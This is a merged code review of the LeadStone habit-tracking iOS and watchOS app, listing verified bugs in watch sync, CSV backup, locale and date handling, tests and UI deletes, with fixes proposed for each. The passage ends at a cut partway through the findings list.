# LeadStone ("lead track") — combined code review

*Merged: July 10, 2026.* This document unifies **two independent exhaustive reviews** of the
full codebase into a single reference:

1. **Review A — "LeadStone code review · July 2026"** (the multi-agent cloud review):
   199 agents, 40 finders across 3 lenses x 11 file groups plus 7 cross-cutting audits,
   adversarially verified with 3-refuter panels for security/privacy → **156 confirmed
   findings** (2 High, 30 Medium, 90 Low, 34 Info; 53 refuted).
2. **Review B — this session's `/code-review` pass** (max effort): 10 independent finder
   angles (correctness, security, cross-file contracts, Swift pitfalls, concurrency, reuse,
   complexity, efficiency, altitude, conventions) → per-candidate adversarial verification
   (several reproduced against the toolchain) → gap sweep.

The two pipelines were run separately and agree strongly: **~30 of Review A's findings were
independently rediscovered by Review B** (marked 🔁 below — treat these as the highest-confidence
items). Review B additionally surfaced **12 findings Review A did not report** (§2) and produced
**one correction** to Review A (§3, dead code that three of its findings target).

Everything below survived adversarial verification against the actual code.

---

## Headline counts

| Severity | Review A (artifact) | New in Review B | Combined |
|---|---:|---:|---:|
| 🔴 High | 2 | 1 | 3 |
| 🟠 Medium | 30 | 3 | 33 |
| 🔵 Low | 90 | 8 | 98 |
| ⚪ Info | 34 | — | 34 |
| **Confirmed total** | **156** | **12** | **168** |

Both reviews converge on the same five load-bearing problem areas: **(1)** the phone-watch sync
protocol has no delivery/ordering/versioning semantics; **(2)** the CSV backup format corrupts or
loses data on round-trip; **(3)** locale- and DST-blind date/number handling; **(4)** `try?` used
as an error-handling doctrine that silently drops data; **(5)** the test suite runs far less than
it appears to. Review B adds a sixth: **recently-shipped refactors have left orphaned subsystems**
(a two-day-old commit silently disabled intention closing and aspiration check-ins).

---

## 1. Cross-review corroboration (highest confidence)

These findings were reported by **both** independent pipelines. Each links to its full entry in §5.

| Finding | Location | Both reviews found |
|---|---|---|
| [f-0](#f-0) · 🔴 | `lead-track Watch App/WatchSyncController.swift:32` | watch retry double-applies actions (un-checks a binary day / double-logs a count) |
| [f-1](#f-1) · 🔴 | `Shared/Services/CSVExporter.swift:71` | CSV date round-trip breaks across locale / 12-24h change (reproduced both directions) |
| [f-2](#f-2) · 🟠 | `Package.swift:31` | CountdownReconcileTests + 4 more excluded tests execute in no runner |
| [f-4](#f-4) · 🟠 | `lead track/Services/HealthSessionExportService.swift:44` | overlapping export passes write duplicate Apple Health records |
| [f-5](#f-5) · 🟠 | `lead-track Watch App/WatchSyncController.swift:29` | queued startTimer lands after a live stopTimer -> phantom running session |
| [f-6](#f-6) · 🟠 | `lead-track Watch App/WatchSyncController.swift:87` | stale application-context clobbers optimistic watch state (no generation token) |
| [f-8](#f-8) · 🟠 | `lead track/Views/CountEntryView.swift:45` | comma-decimal locales cannot enter fractional counts (Double(text)) |
| [f-9](#f-9) · 🟠 | `lead track/Views/IntentionFormView.swift:221` | same comma-decimal parse bug in IntentionFormView |
| [f-11](#f-11) · 🟠 | `Shared/Models/WatchSnapshot.swift:9` | unknown MeasurementType raw value fails the whole snapshot decode -> silent watch freeze |
| [f-12](#f-12) · 🟠 | `Shared/Services/CSVImporter.swift:233` | midnight-crossing session re-imports with a negative duration that poisons totals |
| [f-17](#f-17) · 🟠 | `lead track/Services/PhoneWatchSyncService.swift:46` | try? drops a once-delivered watch action on save failure, with no log/retry |
| [f-19](#f-19) · 🟠 | `lead track/Views/AspirationListView.swift:68` | list-view aspiration delete skips cancelQuestions() the detail view performs |
| [f-20](#f-20) · 🟠 | `lead track/Views/MetricCardView.swift:232` | recording-action quartet duplicated with animation drift (see Correction C1) |
| [f-23](#f-23) · 🟠 | `lead track/Views/ProjectDetailView.swift:155` | ProjectDetailView reads the never-populated inverse project.aspirations |
| [f-25](#f-25) · 🟠 | `lead track/Views/AspirationCardView.swift:23` | AspirationCardView decodes the full-res cover per row in body |
| [f-28](#f-28) · 🟠 | `lead track/Views/ProjectDetailView.swift:100` | single-tap cascade delete with no confirmation (also on ClusterMetricRow, see NN12) |
| [f-39](#f-39) · 🔵 | `Shared/Services/SessionService.swift:296` | stopLiveActivity's fire-and-forget Task ends the NEXT activity on a stop->start |
| [f-53](#f-53) · 🔵 | `README.md:29` | README/CLAUDE.md target inventory drifted (4 targets compile Shared/, docs say 3) |
| [f-59](#f-59) · 🔵 | `Shared/Services/GoalPace.swift:122` | GoalPace divides by a hardcoded 86400, wrong on DST days |
| [f-64](#f-64) · 🔵 | `Shared/Services/NotificationService.swift:177` | weeklyReview UserDefaults keys/defaults duplicated with 3 fallback idioms |
| [f-65](#f-65) · 🔵 | `Shared/Services/SessionStatistics.swift:187` | SessionStatistics trailing-window cutoff inlined 3x despite windowCutoff helper |
| [f-72](#f-72) · 🔵 | `lead track/Views/AspirationAttachPicker.swift:4` | two aspiration attach pickers show contradictory selected-state for the same data |
| [f-77](#f-77) · 🔵 | `lead track/Views/GoalSettingsView.swift:342` | GoalSettings x60/x3600 stored-vs-display conversion mirrored 300 lines apart |
| [f-93](#f-93) · 🔵 | `Shared/Services/CSVExporter.swift:90` | CSV export does not neutralize spreadsheet formula injection |
| [f-94](#f-94) · 🔵 | `Shared/Services/CSVImporter.swift:236` | watch-action / import numeric values are unvalidated (NaN/inf/negative/unbounded) |
| [f-95](#f-95) · 🔵 | `lead track/Services/AppLockService.swift:56` | AppLock permanently locks out a device whose passcode was removed |
| [f-96](#f-96) · 🔵 | `Shared/Services/SessionService.swift:46` | toggleSession's comment-only invariant violated by its own siblings |
| [f-101](#f-101) · 🔵 | `lead track/Views/ClusterMetricRow.swift:120` | ClusterMetricRow.todayTotal full-scans the session history several times per render |
| [f-102](#f-102) · 🔵 | `lead track/Views/MetricCardView.swift:18` | per-render full-history scan for a today-only value (but this view is DEAD, see C1) |
| [f-106](#f-106) · 🔵 | `lead track/Views/WeeklyReviewView.swift:46` | WeeklyReview.build runs inside body on every re-render |
| [f-150](#f-150) · ⚪ | `lead-track Widget/ScoreboardWidget.swift:68` | ScoreboardWidget fetches all metrics + faults all sessions in the memory-capped extension |

> Note on severity: Review A's scale is the canonical one below (it is the larger, calibrated set). Review B weighted two of these higher than Review A did — the **AppLock permanent lockout** ([f-95](#f-95), A: Low) is a fail-closed denial of access to all of a user's data, and **CSV formula injection** ([f-93](#f-93), A: Low) is the app's one untrusted-file egress path. Consider treating both as Medium.


---

## 2. New findings from Review B (not in Review A)

Twelve verified defects Review A did not report, most-severe first. IDs are prefixed `B-` to distinguish them.

<a id="B-1"></a>
#### 🔴 HIGH · `Shared/Services/WeeklyReview.swift:89  (commit ea407ce, PR #72, 2 days ago)`

**B-1 — A two-day-old refactor orphaned the entire intention-closing and aspiration check-in subsystem** · *regression*

PR #72 (`ea407ce`, "Week tab: aspiration-grouped metrics") deleted `WeeklyReviewIntentionsSection.swift` and `AspirationWeekCardActions.swift` — the only UI that closed intentions (Done / Partly / Set Again / promotions) and recorded `AspirationCheckIn`s. The domain layer was left intact but is now unreachable: `WeeklyReview.build` still computes `intentionClosures` on every Week-tab render, yet **no view renders them** (grep: the only `intentionClosures` readers are two tests); `Intention.close(outcome:)` is reachable only through the let-go path; `IntentionRenewal.setAgain` / `offerOnSetAgain` have **zero app-target callers**; and there is **no `AspirationCheckIn(` constructor anywhere in the app targets**. The card retirement itself was intentional per the commit message — the capability loss appears collateral.

*Verification.* Verified: `grep` finds `intentionClosures` referenced only in `WeeklyReview.swift` + 2 test files; `AspirationCheckIn(` has no app-target constructor; `setAgain`/`offerOnSetAgain` have no app callers; `ClusterMetricRow` (the live Today card) is rendered from `ClusterCardView.swift:113`, confirming the Week layout changed wholesale.

**Trigger → outcome.** A user can no longer mark an intention Done/Partly, earn a Set-Again renewal chain or promotion, or record the weekly aspiration alignment check-in; open intentions freeze as unclosed forever, and `AspirationAlignment`'s "story so far" starves. Decide the intent: either **restore** the closure/check-in affordances inside the new aspiration-grouped Week card, or if the removal was deliberate, **delete** the now-dead `intentionClosures` / `setAgain` / `AspirationCheckIn` write paths and their tests so the model matches the shipped product.

<a id="B-2"></a>
#### 🟠 MEDIUM · `Shared/Services/NotificationService.swift:110 (and :138)`

**B-2 — Reminders and streak alerts self-disable for daily loggers — logging today unarms tomorrow** · *correctness*

`scheduleReminder` (line 110) and `scheduleStreakAlert` (line 138) both `guard !hasLoggedToday(metric)`, and `rescheduleMetric` cancels all of the metric's pending requests before rescheduling. So on any day the user logs, both schedulers guard-return and leave **zero** pending requests for that metric. `ReminderPlanner.nextFireDates` is built to fall through to the next goal day, but the guard short-circuits before it is used.

*Verification.* Verified against the live tree: guards present at `NotificationService.swift:110/138`; `ReminderPlanner.nextFireDates` (line 12) computes future goal days via `calendar.date(byAdding:.day…)` and is never reached once today is logged.

**Trigger → outcome.** A user who logs daily and opens the app only to log never receives another reminder or streak-at-risk alert: tomorrow's notifications are only armed if the app happens to be reopened tomorrow before the fire time. **Fix.** Always schedule the next eligible fire from `ReminderPlanner.nextFireDates` regardless of today's completion (or re-arm on the completion write), instead of skipping scheduling entirely for today.

<a id="B-3"></a>
#### 🟠 MEDIUM · `Shared/Services/OversubscriptionInsight.swift:60`

**B-3 — Oversubscription check-in counts days before a goal existed as misses, firing a false alert** · *correctness*

`checkIn` snapshots *today's* set of daily-goal metrics (line 60, filtered only by `hasDailyTarget`, which has no date component) and replays it across the past 21 days, with no regard for when each metric or goal was created. Every prior engaged day on which a just-added goal wasn't met reads as `fellShort` (its `dayTotal` 0 < goal).

*Verification.* Verified: `hasDailyTarget` = `expectsDailyShowUp || dailyGoal != nil` (no creation date); `outcome()` weighs every such metric on every historical engaged day; no test covers a goal created mid-window (only the never-logged case, which is deliberately blessed).

**Trigger → outcome.** User meets a "Meditate" daily goal for weeks, then adds "Read 30m" today: at the next review the missRate jumps to ~100% and a false *"Maybe oversubscribed? … your goals all landed together on only 0 of 21 active days"* fires — directly contradicting the function's own doc that days before the user began never read as misses. **Fix.** Gate each metric's per-day contribution on its (or its goal's) creation / first-session date.

<a id="B-4"></a>
#### 🟠 MEDIUM · `Shared/Services/ValueFormatter.swift:23 (and :45)`

**B-4 — Fractional counts are truncated with Int(), so on-screen rows don't sum to the on-screen total** · *idiom*

`formatCount` and `formatShort` render count values with `Int(value)` (truncation toward zero), but count metrics accept decimals (`CountEntryView`) and persist raw `Double`s (`SessionService.logCount`). Every count surface — rows, widgets, detail, watch — funnels through these formatters.

*Verification.* Verified: `ValueFormatter.swift:23` `let intValue = Int(value)`, `:45` `"\(Int(value))"`; logging path stores the raw Double unrounded.

**Trigger → outcome.** Logging 0.5 km twice shows "0 km" on each of the two rows while the day total (1.0) shows "1 km" — the visible parts contradict the visible total, and a single 0.5 entry reads as if nothing was logged. **Fix.** Round or preserve the fraction consistently at every count surface (e.g. `.number.precision(`.fractionLength(0...2))`).

<a id="B-5"></a>
#### 🔵 LOW · `Shared/Services/InsightGenerator.swift:93 (and :113)`

**B-5 — Tie in the mode detectors is broken nondeterministically, so a fixed past week flips its insight** · *correctness*

`detectTimeOfDayMode` (line 93) and `detectDayOfWeekMode` (line 113) pick the dominant bucket with `Dictionary.max`, whose winner among equal counts depends on per-process dictionary iteration order, and the `>= dominance` threshold admits an exact 2-2 tie.

*Verification.* Verified: `buckets.max(by: { $0.value.count < $1.value.count })` over a `Dictionary(grouping:)`; threshold `ratio >= 0.5` (time) / `0.4` (weekday) lets ties qualify. Review A's f-31 notes the detectors are untested but does not identify this defect.

**Trigger → outcome.** A week with 2 morning + 2 evening sessions renders "Mostly a morning thing" on one launch and "Mostly an evening thing" on the next — for an immutable past week, re-generated on every review render. **Fix.** Add a deterministic tiebreak (stable secondary sort key) and/or require a strict majority.

<a id="B-6"></a>
#### 🔵 LOW · `Shared/Services/MeasureHealth.swift:75`

**B-6 — Streak-saver insight for a historical week is computed from TODAY's streak** · *correctness*

`detectStreakSaver` gates on `SessionStatistics.currentStreak`, which is hard-anchored to `.now` and takes no date parameter, while the rest of the detector windows on the passed-in `now` (a past week's end when browsing earlier reviews via `InsightGenerator`).

*Verification.* Verified: `currentStreak(from:excludedWeekdays:)` anchors on `.now` internally (`streakStart` uses `startOfDay(for: .now)`); `InsightGenerator` forwards the browsed week's `end` as `now` to the rest of the detector. This is the concrete correctness consequence of Review A's general f-111 (SessionStatistics hard-codes `.now`).

**Trigger → outcome.** The same historical week shows or hides the streak-saver card depending on the user's streak *today* — a streak broken yesterday suppresses an insight on a week when the streak was 20 days long. **Fix.** Thread `now:` into `currentStreak` (as `WeeklyReview.build` already does elsewhere) or gate on the historical streak.

<a id="B-7"></a>
#### 🔵 LOW · `Shared/Services/MarkdownExportProfiles.swift:25 (and :60)`

**B-7 — Markdown export splices multi-line user text as document structure (heading forgery / prompt injection)** · *security*

Metric descriptions, aspiration details, and moment notes are appended verbatim into the export (`lines.append(detail)`; the moment renderer indents continuation lines only 2 spaces, which CommonMark still parses as ATX headings at ≤3 leading spaces).

*Verification.* Verified: user text reaches `MarkdownExportProfiles.swift:25/60` and `MarkdownExportLines.moment` with no escaping. Review A's f-15 covers the MOMENTS.md privacy-invariant drift but not this structural injection.

**Trigger → outcome.** A note line like `## Week of June 30` forges the export's week-section structure; and because the artifact is explicitly "written to be pasted into an LLM conversation," an embedded instruction line in user data reads to the model as a document-level directive (prompt injection) rather than quoted testimony. **Fix.** Escape/neutralize user text — prefix `#`/`-`/`>` leaders, fence blocks, or indent continuation lines ≥4 spaces / blockquote them.

<a id="B-8"></a>
#### 🔵 LOW · `lead track/Services/PhoneWatchSyncService.swift  (+ SessionService write paths)`

**B-8 — In-app recording never reloads widget timelines, so the control widget is stale for up to 15 minutes** · *correctness*

Every in-app recording path calls `SessionService`, which contains **no** `WidgetCenter` call; the only `reloadTimelines` sites are the two App Intents, `applyAction` (watch actions), `HealthMetricSyncService`, and `CountdownCoordinator`. So a write made *inside the app* never invalidates the home-screen widgets.

*Verification.* Verified: repo-wide grep for `WidgetCenter`/`reloadAllTimelines` finds no hit in `SessionService.swift` or any `lead track/Views/` file; `TimerControlWidget` timeline policy is `.after(now + 15 min)`. Complements Review A's f-126 (the 15-min policy is also duplicated).

**Trigger → outcome.** Start a timer from the metric-detail dock and `TimerControlWidget` keeps showing "Start" for up to ~15 minutes. **Fix.** Hang `WidgetCenter.shared.reloadAllTimelines()` on the existing `ModelContext.didSave` observer that already reconciles the watch snapshot, so one hub invalidates every denormalized copy.

<a id="B-9"></a>
#### 🔵 LOW · `lead track/Services/PhoneWatchSyncService.swift:28`

**B-9 — Every store save rebuilds the full watch snapshot before checking whether a watch is even paired** · *efficiency*

The `object: nil` `ModelContext.didSave` observer rebuilds the entire `WatchSnapshot` (fetch all metrics, scan each metric's `sessions` relationship twice) on the main actor, and `push()` only checks `isPaired` / `isWatchAppInstalled` **after** the build.

*Verification.* Verified: observer at `PhoneWatchSyncService.swift:81-89`, `currentSnapshot()` builds before the pairing guard at `push()` (`:63-68`); `WatchSnapshotBuilder` scans `metric.sessions` twice per metric. Distinct from Review A's f-3 (rescheduleAll) and f-14 (empty-snapshot on fetch failure).

**Trigger → outcome.** iPhone-only users pay a full O(metrics x all-sessions) rebuild on every save forever, and N health-metric saves at foreground fire N back-to-back rebuilds — main-thread hitches that scale with history. **Fix.** Gate on pairing first; debounce/coalesce saves (~250 ms); compute `todayTotal` from a `startedAt >= startOfDay` `FetchDescriptor` instead of the full relationship.

<a id="B-10"></a>
#### 🔵 LOW · `Shared/Services/TodayClusters.swift:165`

**B-10 — Today cluster ordering recomputes full-history urgency inside the sort comparator** · *efficiency*

`ordered()` calls `urgency(of:)` for **both** sides of every comparison between two `needsYou` clusters, and `urgency` re-derives `metricState` + `completionFraction` — each a full all-time session scan — per metric. The `DayDialView` header similarly makes ~3 full passes over the whole history per render.

*Verification.* Verified: `TodayClusters.swift:165-166` calls `urgency` twice per comparison; `completionFraction` scans `metric.sessions` unconditionally; `TodayGrouping.clusters` runs inside `MetricListView.body`. Same class as Review A's f-37/f-101/f-102 but the sort-comparator and DayDial angles are new.

**Trigger → outcome.** One Today render costs O(k log k) comparator calls x full-history scans; grows with every month of data. **Fix.** Schwartzian transform — precompute each cluster's `(state, urgency)` key once, then sort by the tuple; cache per-metric today totals across the assembly pass.

<a id="B-11"></a>
#### 🟠 MEDIUM · `Shared/Services/CSVImporter.swift:118`

**B-11 — Re-importing the same export doubles all history — no session idempotency** · *correctness*

`applyRow` unconditionally `context.insert`s a `Session` for every data row. Metrics and projects dedup by name via `MetricCache`, but sessions have no lookup and no `#Unique`, so importing the same file twice creates every session again.

*Verification.* Verified: `CSVImporter.swift:111-118` builds and inserts a `Session` per row with no existing-session check; `Session` is a plain `@Model`. (Review A's f-57/f-58/f-93/f-94 cover other CSV issues but not import idempotency.)

**Trigger → outcome.** A user restoring a backup after a partial import, or tapping "Choose CSV File" twice, silently doubles every total, streak, insight, and goal-progress figure; `DataImportView` reports the duplicates as "Sessions created." **Fix.** Dedup on import (skip a row whose metric+startedAt+value+endedAt already exists), or import into a staging set the user confirms.

<a id="B-12"></a>
#### 🟠 MEDIUM · `lead track/Views/ClusterMetricRow.swift:25`

**B-12 — Today's context menu deletes a Metric on one tap with no confirmation, cascading all its sessions and projects** · *SwiftUI*

The Today cluster row's `contextMenu` calls `modelContext.delete(metric)` immediately. `Metric` cascades to both `Project` and `Session` (`Metric.swift:85/90`), and this is the app's only metric-delete path.

*Verification.* Verified: `ClusterMetricRow.swift:23-28` deletes with no `confirmationDialog`; `MetricListView` / `MetricDetailView` contain no other metric delete; milder deletes DO confirm (`AspirationDetailView.swift:40`, `MomentListView.swift:27`). This is the metric-level sibling of Review A's f-28 (which covers the Project toolbar delete).

**Trigger → outcome.** Long-press a metric row intending to open it, tap the lone "Delete Metric" item, and years of sessions plus every project under the metric are cascade-deleted and autosaved with no undo. **Fix.** Gate behind a `confirmationDialog`, consistent with the app's own convention for less destructive deletes.

---

## 3. Corrections to Review A

Review B's verification pass turned up dead code that **three of Review A's findings target as if it were live**:

<a id="C1"></a>
### C1 · `MetricCardView.swift` is dead code (affects f-20, f-102, f-125)

`MetricCardView` has **zero references anywhere outside its own file** (verified: `grep -rn "MetricCardView"`
returns only its own declaration; the live Today dashboard card is `ClusterMetricRow`, rendered from
`ClusterCardView.swift:113`). Consequences for Review A:

- **[f-102](#f-102)** ("Dashboard card builds the full all-time daily-totals history in body") and
  **[f-125](#f-125)** ("todayValue recomputes todayTotal per branch") describe work in a view that **never
  renders** — real code smells, but zero runtime cost. They should be reframed as *delete-the-file*, not
  *optimize-the-body*.
- **[f-20](#f-20)** ("Recording-action logic triplicated across MetricCardView, MetricRecordDock, and
  ClusterMetricRow") is really a **live duplication between `MetricRecordDock` and `ClusterMetricRow`** (with the
  confirmed `.snappy`-vs-default animation drift) **plus a dead third copy**. Fixing it = extract the two live
  copies into one shared component and **delete `MetricCardView.swift`**.

<a id="C2"></a>
### C2 · `SparklineView.swift` is also dead (not in Review A)

`SparklineView` is referenced only by a doc comment in `WeekBarsView.swift:4`; its data feed
`SessionStatistics.trailingDailySeries` has only test callers. It is a near-duplicate of the live `WeekBarsView`.
**Fix.** Delete `SparklineView.swift` and `trailingDailySeries` (and its two tests), or fold the "highlight
today vs highlight peak" difference into `WeekBarsView` as a parameter.

**Net effect:** deleting these two files removes ~300 lines and collapses f-20/f-102/f-125 into one live
duplication plus two deletions.

### Minor duplications Review B adds to Review A's "copy-paste" theme

Small verified duplicates not individually listed by Review A (all extend its *copy-paste outpacing extraction*
theme): `statItem`/`streakItem` are verbatim between `StatisticsView` and `DetailedStatisticsView`; `miniRing`
(`ScoreboardWidget.swift:204`) re-implements `GoalProgressView.progressRing` with a drifted stroke width;
`miniBars` (`WeekHeaderStrip.swift:143`) re-implements `WeekBarsView` with drifted opacity/stub constants; and
`clusterCardSurface()` (`ClusterCardView.swift:191`) re-inlines `Theme.cardShape` despite Theme advertising
itself as the single source of truth for surfaces.

---

## 4. Systemic themes (from Review A)

Most findings are instances of ten recurring patterns; fixing the pattern retires the cluster. Review B confirmed all ten and adds an eleventh.

**1. The watch-sync protocol has no delivery semantics.** The phone↔watch layer assumes exactly-once, in-order delivery, but WatchConnectivity provides neither. Retries double-apply actions (un-doing habit toggles, double-logging counts), a live message can overtake queued ones and leave a phantom running timer, stale snapshots roll back optimistic state, and one unknown enum value from a version-skewed peer silently discards an entire snapshot or a queued recording. One protocol-level fix — action IDs, a snapshot generation counter, and raw-string enums on the wire — addresses the cluster.

<sub>`WatchSyncController.swift:32`  `WatchSyncController.swift:29`  `WatchSyncController.swift:87`  `WatchSnapshot.swift:9`  `WatchSnapshotBuilder.swift:7`</sub>

**2. A locale-blind text-handling class.** The codebase parses and formats assuming en_US: the CSV backup format round-trips through the device locale (data loss on any region/12-24h change), two forms parse decimals with Double(text) so “1,5” never saves in comma-decimal locales, one screen mixes String(format:) into locale-aware siblings, notification copy hand-builds plurals (“1 sessions”), and there is no localization infrastructure at all — locale bugs are being fixed one view at a time.

<sub>`CSVExporter.swift:71`  `CountEntryView.swift:45`  `IntentionFormView.swift:221`  `DetailedStatisticsView.swift:257`  `NotificationService.swift:240`  `project.pbxproj:512`</sub>

**3. try? as an error-handling doctrine.** Failures are systematically swallowed: a SwiftData fetch failure becomes an empty watch snapshot that wipes the watch UI, a failed save silently drops a once-delivered wrist action while the app replies “applied”, a failed photo load erases the existing cover, user-initiated Health sync ignores every error, widget store failures render as “No metrics yet”, and an encode failure pushes an empty sync payload forever. Almost nothing logs. A repo-wide pass replacing silent try? with log-and-degrade (or propagate) would fix a dozen findings at once.

<sub>`WatchSnapshotBuilder.swift:7`  `PhoneWatchSyncService.swift:46`  `AspirationFormView.swift:222`  `HealthMetricSyncService.swift:82`  `ScoreboardWidget.swift:65`  `WatchSyncCodec.swift:11`</sub>

**4. The test suite runs less than it appears to.** iOS unit tests are skipped on CI (no bootable simulator), five test files are additionally excluded from the Linux overlay — so SessionService, ProjectService, and the entire watch-action pipeline have zero executing coverage anywhere — and the UI-test target is wired but never executes (its one test is also stale). Meanwhile the CSV pipeline and all seven InsightGenerator detectors are effectively untested. Regressions in the app’s core recording paths currently ship green.

<sub>`Package.swift:31`  `lead track.xcscheme:55`  `CSVExporterTests.swift:50`  `InsightTests.swift:5`  `SessionStatistics.swift:54`</sub>

**5. Date and time handling is fragile at the edges.** Times-of-day are persisted as year-1 absolute Dates that shift with time zones, week identity uses exact Date equality on a persisted anchor, several services hard-code 86,400-second days (DST-wrong), midnight-crossing sessions import with negative durations, the watch app shows yesterday’s totals as today’s after midnight, and half the statistics layer hard-codes .now/Calendar.current, blocking deterministic tests.

<sub>`ReminderSchedule.swift:45`  `Intention.swift:154`  `CSVImporter.swift:233`  `WatchMetricLabel.swift:42`  `MeasureHealth.swift:162`  `SessionStatistics.swift:54`</sub>

**6. SwiftData lifecycle and migration risk.** A nine-entity schema evolving weekly has no VersionedSchema/SchemaMigrationPlan, and container-creation failure is a fatalError — the first non-additive change risks a launch crash loop on real stores. A widget returns a model past its context’s lifetime (undefined behavior that currently renders by luck), ProjectDetailView reads an inverse relationship that never populates, and every App Intent invocation rebuilds the container and re-runs the stable-ID backfill.

<sub>`SharedModelContainer.swift:8`  `TimerControlWidget.swift:85`  `ProjectDetailView.swift:155`  `StartTimerIntent.swift:25`</sub>

**7. Privacy posture: solid core, leaky edges.** No spyware-grade issues — data stays local — but the edges leak: notifications, the Live Activity, and home-screen widgets all show metric names, streaks, and totals on the lock screen and fully bypass the biometric app lock; cover photos retain EXIF GPS; the location usage string says data “never leaves your iPhone” while coordinates go to Apple’s geocoder; CSV exports don’t neutralize formula injection and imports accept NaN/infinity.

<sub>`NotificationService.swift:266`  `TimerActivityLiveActivity.swift:98`  `ScoreboardWidget.swift:170`  `AspirationFormView.swift:222`  `MomentLocationReader.swift:92`  `CSVExporter.swift:90`</sub>

**8. Copy-paste is outpacing extraction.** The same logic lives in 2–4 places across targets: recording actions are triplicated across three dashboard surfaces (already drifting), countdown-interval math ×3, weekday-exclusion ×3, display-order comparators ×4, the stableID-fallback identity pattern ×10+, unit conversions as inverse magic numbers 300 lines apart, and the CSV schema as two independent string literals. Each is small; together they are the dominant maintainability tax.

<sub>`MetricCardView.swift:232`  `Session.swift:70`  `WatchSnapshot.swift:107`  `AspirationAttachedListView.swift:37`  `TodayGrouping.swift:15`  `GoalSettingsView.swift:342`</sub>

**9. Docs have drifted from the shipped product.** MOMENTS.md still declares privacy invariants (“nothing enters exports”, “no moment counts anywhere”) that the shipped markdown export deliberately violates; RELEASE.md’s bundle-ID claims are contradicted by the release workflow’s own workaround script; the README opens with the Xcode template description; and the product is called LeadStone everywhere users see it, while docs and the export artifact still say “lead track”.

<sub>`MOMENTS.md:53`  `RELEASE.md:25`  `README.md:3`  `MarkdownExporter.swift:71`</sub>

**10. Main-thread and render-loop hot spots.** App activation runs full-history statistics synchronously on the main actor (several O(all-sessions) passes per metric), WeeklyReview.build executes inside body on every re-render, the heatmap rebuilds its totals dictionary once per grid cell (112×), dashboard cards decode full-resolution photos and build all-time histories in body. All fixable with hoisting, caching, or a Task.

<sub>`NotificationService.swift:14`  `WeeklyReviewView.swift:46`  `CalendarHeatmapView.swift:95`  `AspirationCardView.swift:23`  `MetricCardView.swift:18`</sub>

**11. Recently-shipped refactors leave orphaned subsystems (Review B).** A two-day-old commit deleted the Week tab's intention/check-in UI but left the model, planner, and `WeeklyReview.build` computation behind, so an entire user-facing capability is silently dead ([B-1](#B-1)). Pair large view refactors with a dead-code sweep of the services they used to call.


<sub>`WeeklyReview.swift:89`  `IntentionRenewal.setAgain`  `AspirationCheckIn`</sub>


---

## 5. All Review A findings (full detail)

The complete verified set, grouped by severity. 🔁 marks the ones Review B independently confirmed (§1).


### High severity (2)

<a id="f-0"></a>
#### 🔴 HIGH · `lead-track Watch App/WatchSyncController.swift:32`

**At-least-once delivery with no idempotency: sendMessage error fallback re-queues the same action, double-applying it on the phone**

> 🔁 **Independently confirmed by both reviews** — this session's max-effort pass also surfaced this: watch retry double-applies actions (un-checks a binary day / double-logs a count).

perform(_:) sends the action via sendMessage and, on ANY error, falls back to transferUserInfo with the identical payload. WCSession's errorHandler also fires for WCErrorCode.messageReplyTimedOut / .messageReplyFailed — cases where the phone DID receive and apply the action but the reply did not make it back in time. The reply-timeout window is widened by the phone side, which hops to the MainActor and performs the full SwiftData apply + snapshot rebuild + updateApplicationContext before invoking replyHandler (PhoneWatchSyncService.swift:124-127). WatchAction carries no unique ID (Shared/Models/WatchAction.swift has only kind/metricID/value/timestamp), and WatchActionHandler performs no dedup. startTimer/stopTimer happen to be idempotent, but logValue double-logs the count (todayTotal and a second Session row) and toggleDay UN-DOES the toggle (second apply deletes the day's session), so the retry path actively corrupts data.

**Fix.** Add a UUID `id` to WatchAction; on the phone keep a small ring buffer of recently applied action IDs and drop duplicates in WatchActionHandler/PhoneWatchSyncService. Alternatively, only run the transferUserInfo fallback for errors that guarantee non-delivery (.notReachable, .deliveryFailed), and call replyHandler before the heavy apply/push work.


<a id="f-1"></a>
#### 🔴 HIGH · `Shared/Services/CSVExporter.swift:71`

**CSV wire format uses locale-sensitive date/time formatting, so round-trip import breaks across locale or 12/24-hour changes**

> 🔁 **Independently confirmed by both reviews** — this session's max-effort pass also surfaced this: CSV date round-trip breaks across locale / 12-24h change (reproduced both directions).

Rows are written with `Date.formatted(date: .numeric, time: .standard)` and re-parsed in CSVImporter.parseTimestamp with the same implicit-current-locale `Date.FormatStyle` and `Calendar.current`. The CSV is a wire/backup format (DataExportView shares it, DataImportView re-imports it), but its Date/Start/End columns depend on the device's region format, 12/24-hour setting, and time zone at the moment of export. A file exported on an en_US device ("7/10/2026", "3:04:05 PM") imported on a de_DE device (or after the user toggles 24-hour time) fails `try? Date(date, strategy:)` for every row; each row is silently counted in rowsSkipped and the data is lost. The checklist rule applies directly: never use locale-sensitive format strings for wire formats.

**Fix.** Emit and parse a fixed format: `Date.ISO8601FormatStyle` (one combined timestamp column, or date + time with explicit `locale: Locale(identifier: "en_US_POSIX")` and a fixed calendar/timezone policy). For backward compatibility, have the importer try ISO8601 first and fall back to the current locale-sensitive strategy for old files.



### Medium severity (30)

<a id="f-2"></a>
#### 🟠 MEDIUM · `Package.swift:31`

**Five test files execute nowhere: excluded from the Linux overlay while the iOS CI test run is skipped**

> 🔁 **Independently confirmed by both reviews** — this session's max-effort pass also surfaced this: CountdownReconcileTests + 4 more excluded tests execute in no runner.

CountdownReconcileTests.swift, DefaultProjectTests.swift, SessionMoveTests.swift, WatchActionHandlerTests.swift and WatchSnapshotBuilderTests.swift are excluded from the SwiftPM test target (they need SwiftData stores), so `swift test` never runs them. The only other runner is the macOS job in .github/workflows/ios.yml, whose Test step is gated on `steps.sim.outputs.have_sim == 'true'` and is currently always skipped because the runner image has no bootable simulator (the workflow itself warns 'skipping the test run'). Net effect: SessionService (countdown auto-stop, toggle semantics), ProjectService (single-default invariant, auto-assignment) and the entire WatchActionHandler/WatchSnapshotBuilder sync path have zero executing test coverage anywhere, and regressions in them ship green.

**Fix.** Either restore a bootable simulator on the macOS job (or run `swift test` on a macOS runner where SwiftData is available to the open toolchain), or refactor these tests' subjects so the pure logic is testable in the overlay (e.g., extract the countdown-reconcile decision and default-project selection into ModelContext-free functions, as was done for other services). At minimum, make the CI job fail loudly (not warn) when the test run is skipped so the gap stays visible.


<a id="f-22"></a>
#### 🟠 MEDIUM · `Shared/Services/SharedModelContainer.swift:8`

**No VersionedSchema/SchemaMigrationPlan for a 9-entity schema under rapid evolution, and container-creation failure is a fatalError crash loop**

